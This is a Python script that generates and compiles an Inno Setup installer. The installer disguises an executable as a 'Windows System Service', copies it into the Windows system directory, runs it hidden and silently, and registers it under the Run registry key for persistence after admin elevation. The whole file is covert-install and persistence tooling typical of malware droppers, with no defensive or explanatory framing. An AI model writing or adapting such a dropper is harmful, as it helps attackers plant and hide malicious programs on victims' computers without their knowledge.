# create_installer.py
import os
import sys
from win32elevate import elevate
from win32com.client import Dispatch

def create_silent_installer():
    # Create an InnoSetup script
    inno_script = """
    [Setup]
    AppName=Windows System Service
    AppVersion=1.0
    DefaultDirName={sys}\WindowsService
    DisableWelcomePage=yes
    DisableProgramGroupPage=yes
    UninstallDisplayIcon={app}\WindowsService.exe
    OutputBaseFilename=SystemServiceSetup
    Compression=lzma2
    SolidCompression=yes
    PrivilegesRequired=admin
    DisableFinishedPage=yes
    CreateAppDir=no
    Silent=yes
    
    [Files]
    Source: "dist\WindowsService.exe"; DestDir: "{sys}"; Flags: ignoreversion
    
    [Run]
    Filename: "{sys}\WindowsService.exe"; Flags: runhidden nowait
    
    [Registry]
    Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "WindowsService"; ValueData: "{sys}\WindowsService.exe"; Flags: uninsdeletevalue
    """
    
    with open("installer.iss", "w") as f:
        f.write(inno_script)
    
    # Compile installer
    os.system('"C:\Program Files (x86)\Inno Setup 6\ISCC.exe" installer.iss')

if __name__ == "__main__":
    elevate()  # Run with admin rights
    create_silent_installer()